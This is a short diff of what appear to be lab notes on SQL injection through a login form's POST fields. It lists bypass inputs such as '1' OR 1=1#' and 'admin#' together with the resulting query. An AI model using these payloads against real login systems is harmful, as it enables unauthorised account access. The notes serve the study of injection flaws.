@@ -1,2 +1,12 @@
 # POST METHOD SQLi
 
+# We know we can run code by hashing out the last comment
+# Let's see if we have an admin account
+username: admin
+SELECT * FROM accounts WHERE username='admin' AND password='1' OR 1=1#'
+password: 1' OR 1=1#\
+
+# Admin account password was 1 so success
+# Now we try to manipulate the username portion
+username: admin#
+password: whatever you want
